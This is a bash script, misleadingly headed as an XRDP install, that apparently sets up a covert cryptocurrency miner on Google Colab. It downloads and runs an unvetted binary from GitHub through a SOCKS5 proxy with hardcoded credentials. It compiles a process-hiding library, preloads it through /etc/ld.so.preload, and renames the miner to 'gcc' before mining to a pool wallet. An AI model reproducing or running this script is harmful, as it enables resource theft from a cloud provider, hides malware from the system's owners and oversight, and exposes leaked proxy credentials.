# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R rstd30
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
tar -xvzf graphics.tar.gz
cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
select_proxy_mode=socks5_only
socks5 = sg-socks5.woiden.net:8080
socks5_username = woiden_geha
socks5_password = mahesw@R1
END
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep .2
echo " "
echo " "
echo "**************"
./graftcp/graftcp curl ifconfig.me
echo " "
echo " "
echo "**************"
echo " "
echo " "
./graftcp/graftcp wget https://github.com/mauliki9999/codet/raw/main/rstd
chmod 700 rstd
mv rstd bezzHash
./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
chmod bezzHash
mv bezzHash gcc
echo " "
echo " "
echo "**************"
echo " "
echo " "
./graftcp/graftcp ./gcc -a cryptonight-upx/2 -o stratum+tcp://rx-us.unmineable.com:13333 -u TRX:TWaMNYJS8hLkrsvjQ8DNJSMuWPjJxUq8zR.$(echo jg/$(shuf -i 1-999 -n 1))#hdij-gkd6 -p --asm=ryzen -k -t30 --cpu-priority 5 && sleep 99999999
